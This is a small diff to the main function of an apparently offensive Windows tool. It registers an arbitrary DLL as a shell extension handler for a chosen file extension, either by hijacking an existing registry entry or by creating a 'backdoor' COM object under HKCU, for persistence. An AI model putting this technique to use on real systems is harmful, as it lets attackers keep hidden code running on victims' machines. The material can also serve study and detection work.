@@ -36,13 +36,12 @@ int wmain(int argc, wchar_t* argv[]) {
         return 1;
     }
 
-    int byte_value = _wtoi(argv[1]);
-
+    BYTE byte_value = _wtoi(argv[1]);
     WCHAR* path_to_dll = NULL;
     WCHAR* extension = NULL;
     BOOL hijack = false;
 
-    for (int i = 2; i < argc; ++i) {
+    for (int i = 2; i < argc; i++) {
         if (wcscmp(argv[i], L"-d") == 0 && i + 1 < argc) {
             path_to_dll = argv[++i];
         }
@@ -69,13 +68,13 @@ int wmain(int argc, wchar_t* argv[]) {
 
     if (hijack) {
 
-        reg::Hijack(THUMBNAIL_IMAGE_HANDLER, extension, path_to_dll);
+        reg::Hijack(byte_value, extension, path_to_dll);
 
     }
     else {
 
         GUID guid = reg::CreateBackdoorObj(HKCU, path_to_dll);
-        reg::AddTechnique(THUMBNAIL_IMAGE_HANDLER, extension, guid);
+        reg::AddTechnique(byte_value, extension, guid);
     }
 
     return 0;
